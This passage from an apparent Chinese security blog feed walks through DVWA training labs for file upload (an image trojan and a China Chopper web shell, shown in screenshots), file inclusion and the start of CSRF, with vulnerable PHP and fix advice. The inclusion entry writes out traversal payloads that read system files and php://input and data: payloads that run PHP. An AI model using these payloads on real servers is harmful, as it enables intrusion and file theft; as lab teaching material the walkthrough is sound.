punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Can we move the file to the upload folder?</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// No</span>            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Yes!</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$target_path} succesfully uploaded!&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Invalid file</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>在上传过程中对文件后缀类型进行白名单限制，同时对文件大小以及图片尺寸大小进行检查，需要制作图片木马并结合命令注入（重命名文件名）进行漏洞利用。</li></ul><p><strong>漏洞利用：</strong></p><ul><li>准备攻击文件（图片木马）。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/创建攻击脚本-High.png" alt="创建攻击脚本"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/制作图片木马.png" alt="制作图片木马"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/上传图片木马.png" alt="上传图片木马"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/图片木马上传成功.png" alt="图片木马上传成功"></center><ul><li>借助命令注入实现文件包含漏洞利用。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/图片木马还原.png" alt="图片木马还原"></center><ul><li>使用中国菜刀连接WebShell。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/菜刀连接.png" alt="菜刀连接"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/菜刀连接成功.png" alt="菜刀连接成功"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/菜刀文件管理.png" alt="菜刀文件管理"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/image-20200914112222452.png" alt="菜刀虚拟终端"></center><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>​        设置 DVWA 安全级别为 Impossible。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// File information</span>    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'type'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Where are we going to be writing to?</span>    <span class="token variable">$target_path</span>   <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token punctuation">.</span> <span class="token string">'hackable/uploads/'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span>    <span class="token variable">$target_file</span>   <span class="token operator">=</span>  <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$uploaded_name</span> <span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span>     <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">ini_get</span><span class="token punctuation">(</span> <span class="token string">'upload_tmp_dir'</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">''</span> <span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span> <span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span> <span class="token function">ini_get</span><span class="token punctuation">(</span> <span class="token string">'upload_tmp_dir'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span>    <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$uploaded_name</span> <span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Is it an image?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'jpg'</span> <span class="token operator">||</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'jpeg'</span> <span class="token operator">||</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'png'</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string">'image/jpeg'</span> <span class="token operator">||</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string">'image/png'</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">getimagesize</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string">'image/jpeg'</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">imagejpeg</span><span class="token punctuation">(</span> <span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">imagepng</span><span class="token punctuation">(</span> <span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">imagedestroy</span><span class="token punctuation">(</span> <span class="token variable">$img</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Can we move the file to the web root from the temp folder?</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">rename</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token punctuation">(</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token punctuation">.</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token variable">$target_file</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Yes!</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;a href='${target_path}${target_file}'>${target_file}&lt;/a> succesfully uploaded!&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// No</span>            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Delete any temp files</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">file_exists</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Invalid file</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><ul><li>对上传的文件类型、大小等进行限制，同时还对上传文件进行重命名。</li></ul><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>设置项目目录权限：可写目录不执行，执行目录不可写</li><li>使用白名单机制对文件类型(mine-type)和文件后缀进行限制</li><li>对上传文件大小进行限制</li><li>文件存储到服务器时文件名称随机化，禁止使用用户上传指定的文件名称</li><li>针对图片文件使用压缩或重设图片像素大小</li><li>上传文件存放在独立服务器使用  </li></ul><h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><ul><li>《DVWA 漏洞测试平台分析》，红日安全工具研发组长-Silence</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-FileInclusion</title>
      <link href="/2020/09/13/dvwa-fileinclusion/"/>
      <url>/2020/09/13/dvwa-fileinclusion/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>​        文件包含是指应用程序加载的文件（本地/远程）可以由用户提交的数据控制，从而导致攻击者控制恶意文件在服务器上执行。</p><p><strong>File Inclusion模块分析</strong>：</p><ul><li>仿源码文件执行功能：</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/防执行源码文件.png" alt="防执行源码文件"></center><ul><li><code>file1.php</code>文件执行结果：</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/file1执行结果.png" alt="file1执行结果"></center><h1 id="0x02-测试工具"><a href="#0x02-测试工具" class="headerlink" title="0x02 测试工具"></a>0x02 测试工具</h1><ul><li>FireFox</li><li>HackBar</li></ul><h1 id="0x03-漏洞测试"><a href="#0x03-漏洞测试" class="headerlink" title="0x03 漏洞测试"></a>0x03 漏洞测试</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><p>设置 DVWA 安全级别为 LOW 。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// The page we wish to display</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><ul><li>代码直接读取 page 参数同时使用 include 进行文件包含执行  </li></ul><p><strong>漏洞利用</strong>：</p><ul><li>使用浏览器发起本地文件包含攻击，payload：</li></ul><pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwordc<span class="token punctuation">:</span>\<span class="token package"><span class="token punctuation">\</span>windows<span class="token punctuation">\</span>win</span><span class="token punctuation">.</span>ini</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/本地文件包含-low.png" alt="本地文件包含-low"></center><ul><li>使用浏览器发起远程文件包含攻击</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/创建远程恶意脚本.png" alt="创建远程恶意脚本"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/启动远程Web服务器.png" alt="启动远程Web服务器"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/远程文件包含执行.png" alt="远程文件包含执行"></center><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>​        设置 DVWA 安全级别为 Medium。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// The page we wish to display</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Input validation</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "https://" ), "", $file );</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string">"../"</span><span class="token punctuation">,</span> <span class="token string">"..\""</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><ul><li>清除 page 参数中的 <code>http://、 https://、 ../、 ..\</code>字符串, 可以使用 <code>php://input</code>， <code>php://filter</code>,<br><code>data url schema</code>等进行注入，也可使用替换逻辑漏洞(只替换一次)将被替换字符串迭代使用，例如 <code>hthttp://tp://</code>被替换后为<code>http://</code> </li></ul><p><strong>漏洞利用：</strong></p><ul><li>使用浏览器发起本地文件包含攻击，payload：</li></ul><pre class=" language-php"><code class="language-php">…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>password…<span class="token punctuation">.</span><span class="token comment" spellcheck="true">//….//….//….//….//….//….//….//….//….//etc/password</span></code></pre><ul><li>使用浏览器发起远程文件包含攻击，payload：</li></ul><pre class=" language-php"><code class="language-php">hthttp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//tp://localhost:9999/file_include_low.php</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input &lt;?php phpinfo();</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">;</span>charset<span class="token operator">=</span>utf<span class="token number">-8</span><span class="token punctuation">,</span><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/远程文件包含php.png" alt="远程文件包含php"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileInclusion/远程文件包含-文件头.png" alt="远程文件包含-文件头"></center><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>​    设置 DVWA 安全级别为 High。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// The page we wish to display</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Input validation</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">fnmatch</span><span class="token punctuation">(</span> <span class="token string">"file*"</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"include.php"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// This isn't the page we want!</span>    <span class="token keyword">echo</span> <span class="token string">"ERROR: File not found!"</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>对提交参数进行检查，只允许<code>include.php</code>以及 <code>file</code>开头的文件被包含，只能包含本地<code>file</code>开头的文件或配合文件上传漏洞组合进行利用  </li></ul><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>​        设置 DVWA 安全级别为 Impossible。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// The page we wish to display</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Only allow include.php or file{1..3}.php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"include.php"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"file1.php"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"file2.php"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"file3.php"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// This isn't the page we want!</span>    <span class="token keyword">echo</span> <span class="token string">"ERROR: File not found!"</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>使用白名单，防止文件包含执行除此以外的文件。</li></ul><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>使用白名单列表限制被包含文件</li><li>关闭远程文件包含功能</li><li>避免 web 服务器启动用户权限过高  </li></ul><h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><ul><li>《DVWA 漏洞测试平台分析》，红日安全工具研发组长-Silence</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-CSRF</title>
      <link href="/2020/09/13/dvwa-csrf/"/>
      <url>/2020/09/13/dvwa-csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>​        跨站请求伪造是指攻击者引诱用户访问页面，攻击页面使用该用户身份在第三方网站自动进行操作。</p><p><strong>CSRF模块分析</strong></p><ul><li>模拟密码修改功能：</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/ChangeYourPassword.png" alt="ChangeYourPassword"></center><ul><li>密码修改</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/PasswordChanged.png" alt="PasswordChanged"></center><h1 id="0x02-测试工具"><a href="#0x02-测试工具" class="headerlink" title="0x02 测试工具"></a>0x02 测试工具</h1><ul><li>FireFox</li><li>BurpSuite</li></ul><h1 id="0x03-漏洞测试"><a href="#0x03-漏洞测试" class="headerlink" title="0x03 漏洞测试"></a>0x03 漏洞测试</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><p>​    设置 DVWA 安全级别为 LOW 。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Do the passwords match?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// They do!</span>        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Update the database</span>        <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> <span class="token 